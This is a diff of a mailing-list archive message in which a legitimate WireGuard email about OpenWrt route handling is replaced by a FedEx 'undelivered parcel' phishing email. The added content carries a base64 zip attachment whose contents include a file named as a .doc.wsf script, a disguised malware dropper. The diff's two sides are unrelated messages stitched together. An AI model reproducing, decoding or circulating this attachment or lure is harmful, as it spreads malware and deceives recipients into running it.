@@ -1,29 +1,23 @@
-Return-Path: Jason@zx2c4.com
+Return-Path: sim1ru@v178529.vps.mcdir.ru
 Received: from krantz.zx2c4.com (localhost [127.0.0.1])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id c9d622dd
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 726cea72
  for <wireguard@lists.zx2c4.com>;
- Sun, 18 Dec 2016 20:07:29 +0000 (UTC)
-Received: from frisell.zx2c4.com (frisell.zx2c4.com [192.95.5.64])
- by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 6bf1b220
+ Sun, 18 Dec 2016 22:32:12 +0000 (UTC)
+Received: from v178529.vps.mcdir.ru (v178529.vps.mcdir.ru [178.208.90.164])
+ by krantz.zx2c4.com (ZX2C4 Mail Server) with ESMTP id 541709c7
  for <wireguard@lists.zx2c4.com>;
- Sun, 18 Dec 2016 20:07:29 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTP id feffa681
- for <wireguard@lists.zx2c4.com>;
- Sun, 18 Dec 2016 20:07:29 +0000 (UTC)
-Received: by frisell.zx2c4.com (ZX2C4 Mail Server) with ESMTPSA id ea266ec6
- (TLSv1.2:ECDHE-RSA-AES128-GCM-SHA256:128:NO)
- for <wireguard@lists.zx2c4.com>;
- Sun, 18 Dec 2016 20:07:29 +0000 (UTC)
-Received: by mail-oi0-f48.google.com with SMTP id b126so127396724oia.2
- for <wireguard@lists.zx2c4.com>; Sun, 18 Dec 2016 12:14:19 -0800 (PST)
+ Sun, 18 Dec 2016 22:32:12 +0000 (UTC)
+Received: from sim1ru by v178529.vps.mcdir.ru with local (Exim 4.84_2)
+ (envelope-from <sim1ru@v178529.vps.mcdir.ru>) id 1cIk6g-0004RJ-8w
+ for wireguard@lists.zx2c4.com; Mon, 19 Dec 2016 01:39:02 +0300
+To: wireguard@lists.zx2c4.com
+Subject: Courier was not able to deliver your parcel (ID00000399864, FedEx)
+Date: Sun, 18 Dec 2016 22:39:02 +0000
 MIME-Version: 1.0
-From: "Jason A. Donenfeld" <Jason@zx2c4.com>
-Date: Sun, 18 Dec 2016 21:14:18 +0100
-Message-ID: <CAHmME9q+aZNDDH5Nsnn1O7+4RxFm489f08oOmyGpWsVx1pLxwg@mail.gmail.com>
-Subject: openwrt route_allowed_ips is inprecise
-To: =?UTF-8?Q?Dan_L=C3=BCdtke?= <mail@danrl.com>
-Content-Type: text/plain; charset=UTF-8
-Cc: WireGuard mailing list <wireguard@lists.zx2c4.com>
+Message-ID: <dd2a93baf19ee1ce295fa0965271058a@sim1.ru>
+From: "FedEx Home Delivery" <juan.todd@sim1.ru>
+Content-Type: multipart/mixed; boundary="b1_1ebbe667e5278b5cd9c0207360222be2"
+Reply-To: FedEx Home Delivery <juan.todd@sim1.ru>
 List-Id: Development discussion of WireGuard <wireguard.lists.zx2c4.com>
 List-Unsubscribe: <https://lists.zx2c4.com/mailman/options/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=unsubscribe>
@@ -33,45 +27,85 @@ List-Help: <mailto:wireguard-request@lists.zx2c4.com?subject=help>
 List-Subscribe: <https://lists.zx2c4.com/mailman/listinfo/wireguard>,
  <mailto:wireguard-request@lists.zx2c4.com?subject=subscribe>
 
-Hey Dan,
+--b1_1ebbe667e5278b5cd9c0207360222be2
+Content-Type: text/plain; charset=us-ascii
 
-The route_allowed_ips directive is not precise enough. I'm CCing Jorg,
-the NixOS maintainer, because this same concern probably applies to
-the Nix logic.
+Dear Customer,
 
-Your code is:
+This is to confirm that your item has been shipped at December 18.
 
-  if [ ${route_allowed_ips} -ne 0 ]; then
-   for allowed_ip in ${allowed_ips}; do
-     case "${allowed_ip}" in
-       *:*/*)
-         proto_add_ipv6_route "${allowed_ip%%/*}" "${allowed_ip##*/}"
-       ;;
-       */*)
-         proto_add_ipv4_route "${allowed_ip%%/*}" "${allowed_ip##*/}"
-       ;;
-     esac
-   done
- fi
+Please check the attachment for complete details!
 
-The way it should be done is described in wg-config:
+With gratitude,
+Juan Todd,
+Chief Delivery Manager.
 
-https://git.zx2c4.com/WireGuard/tree/contrib/examples/wg-config/wg-config#n130
 
-    if [[ $AUTO_ROUTE -eq 1 ]]; then
-        for i in $(wg show "$INTERFACE" allowed-ips | cut -f 2 | tr -d ,); do
-            if ! add_default "$i" && [[ $(ip route get "$i") != *dev\
-$INTERFACE\ * ]]; then
-                add_route "$i"
-            fi
-        done
-    fi
+--b1_1ebbe667e5278b5cd9c0207360222be2
+Content-Type: application/zip; name="Undelivered-Parcel-ID-00000399864.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=Undelivered-Parcel-ID-00000399864.zip
 
-The add_default thing just accounts for dealing with 0/1 128/1, which
-you can ignore, since openwrt has the dependency mechanism. But the
-important thing is that I run `ip route get` for each one, and only
-add a route if necessary.
+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
+DAAAAAA=
 
-FYI.
 
-Jason
+--b1_1ebbe667e5278b5cd9c0207360222be2--
